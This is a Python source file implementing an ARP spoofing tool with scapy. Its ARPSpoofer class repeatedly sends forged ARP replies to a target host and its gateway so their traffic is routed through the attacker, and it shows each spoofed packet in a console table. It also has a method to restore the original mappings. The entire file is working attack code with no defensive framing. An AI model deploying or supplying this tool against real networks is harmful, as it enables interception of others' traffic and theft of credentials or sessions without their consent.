import scapy.all as scapy
import time
from rich.table import Table
from rich.console import Console

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.table = Table(title="ARP Spoofing")
        self.table.add_column("Time", style="cyan", no_wrap=True)
        self.table.add_column("Source", style="magenta")
        self.table.add_column("Destination", style="green")
        self.table.add_column("Packet Summary", style="yellow")
        self.console = Console()

    def _get_mac(self, ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)
        if (len(answered_list) == 0):
            raise Exception("No response received")
        return answered_list[0][0][1].hwsrc

    def _spoof(self, target_ip, spoof_ip):
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = self._get_mac(target_ip),
                                                                psrc = spoof_ip)
        scapy.send(packet, verbose = False)
        self.table.add_row(time.strftime("%H:%M:%S"), spoof_ip, target_ip, packet.summary())

    def _restore(self, destination_ip, source_ip):
        destination_mac = self._get_mac(destination_ip)
        source_mac = self._get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)
    
    def restore(self):
        self._restore(self.target_ip, self.gateway_ip)
        self._restore(self.gateway_ip, self.target_ip)
        

    def run(self):
        while True:
            self._spoof(self.target_ip, self.gateway_ip)
            self._spoof(self.gateway_ip, self.target_ip)
            self.console.clear()
            self.console.print(self.table)
            time.sleep(2)
